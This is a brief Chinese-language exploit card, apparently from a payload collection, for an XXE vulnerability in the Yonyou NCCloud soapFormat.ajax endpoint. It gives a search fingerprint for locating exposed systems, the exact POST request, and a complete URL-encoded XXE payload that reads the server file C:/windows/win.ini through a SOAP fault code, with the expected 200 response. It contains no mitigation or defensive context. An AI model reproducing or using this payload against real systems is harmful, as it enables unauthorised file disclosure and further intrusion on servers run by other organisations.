# 用友NCCloudsoapFormat.ajax接口XXE漏洞

- **系统**：用友　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`body="/Client/Uclient/UClient.exe"`
- **请求**：`POST /uapws/soapFormat.ajax HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
```
- **预期**：200　|　support